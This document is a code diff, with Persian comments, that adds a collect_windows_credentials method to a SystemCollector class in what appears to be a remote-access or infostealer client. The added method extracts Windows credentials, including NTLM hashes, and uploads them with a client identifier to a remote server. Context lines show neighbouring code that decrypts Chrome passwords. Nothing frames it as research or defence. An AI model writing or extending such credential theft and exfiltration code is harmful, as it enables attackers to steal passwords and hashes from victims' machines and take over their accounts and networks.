@@ -553,6 +553,56 @@ class SystemCollector:
             
         return passwords
 
+    def collect_windows_credentials(self):
+        """جمع‌آوری credential های ویندوز"""
+        if not Config.ENABLE_WINDOWS_CREDENTIALS:
+            return {
+                "status": "disabled",
+                "message": "Windows credential collection disabled in config",
+                "timestamp": datetime.now().isoformat()
+            }
+        
+        try:
+            self.logger.info("🔐 Collecting Windows credentials...")
+            
+            from system.credential_extractor import CredentialExtractor
+            extractor = CredentialExtractor()
+            
+            # استخراج credential ها
+            credentials = extractor.extract_windows_credentials()
+            
+            # اضافه کردن به نتایج
+            self.results["windows_credentials"] = credentials
+            
+            # ارسال به سرور اگر موفق بود
+            if credentials.get("status") == "success":
+                try:
+                    self.communicator.upload_windows_credentials({
+                        "client_id": self.client_id,
+                        "credentials": credentials.get("credentials", []),
+                        "hash_count": len([c for c in credentials.get("credentials", []) if c.get("ntlm_hash")]),
+                        "timestamp": datetime.now().isoformat(),
+                        "extraction_stats": {
+                            "total_credentials": credentials.get("credentials_found", 0),
+                            "successful": True
+                        }
+                    })
+                    self.logger.info("✅ Windows credentials uploaded to server")
+                except Exception as e:
+                    self.logger.warning(f"⚠️ Failed to upload credentials: {str(e)}")
+            
+            self.logger.info(f"✅ Windows credentials collection completed: {credentials.get('credentials_found', 0)} found")
+            return credentials
+            
+        except Exception as e:
+            error_msg = f"❌ Failed to collect Windows credentials: {str(e)}"
+            self.logger.error(error_msg)
+            return {
+                "status": "error",
+                "message": error_msg,
+                "timestamp": datetime.now().isoformat()
+            }
+
     def _decrypt_chrome_password(self, encrypted_password: bytes) -> str:
         """دکریپت کردن پسورد Chrome"""
         try:
